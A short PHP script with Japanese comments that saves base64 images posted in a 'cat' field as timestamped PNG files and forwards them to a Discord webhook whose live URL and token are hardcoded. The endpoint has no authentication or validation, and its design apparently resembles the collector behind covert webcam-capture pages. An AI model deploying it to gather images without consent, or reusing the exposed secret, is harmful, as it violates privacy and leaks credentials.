<?php
// ========= 画像保存 & Discord通知処理 =========

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cat'])) {
    // 📅 現在の日時でファイル名を作成
    $date = date('YmdHis');
    $imageData = $_POST['cat'];
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $filename = __DIR__ . '/' . $date . '.png';
    file_put_contents($filename, $unencodedData);

    // 📣 Discord Webhook URL（自分のに変更してね！）
    $discordWebhookUrl = 'https://discord.com/api/webhooks/1361553545379188917/QSKZGGkXtDeqUD4c61hEatZHfY8bD1BObJ1sM250eZpL6O_ocP45oYK1iVy8Y-3eB44q';

    // 📦 Discordに画像を送信
    $boundary = uniqid();
    $delimiter = '-------------' . $boundary;

    $postData = build_multipart_data($filename, $delimiter);

    $headers = [
        "Content-Type: multipart/form-data; boundary=" . $delimiter,
        "Content-Length: " . strlen($postData),
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $discordWebhookUrl,
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postData
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    // ✅ 応答
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();
}

// 🔧 画像をmultipart形式で送るための関数
function build_multipart_data($filepath, $boundary) {
    $eol = "\r\n";
    $filename = basename($filepath);
    $filedata = file_get_contents($filepath);

    $data = "--$boundary$eol";
    $data .= "Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"$eol";
    $data .= "Content-Type: image/png$eol$eol";
    $data .= $filedata . $eol;
    $data .= "--$boundary--$eol";

    return $data;
}
?>
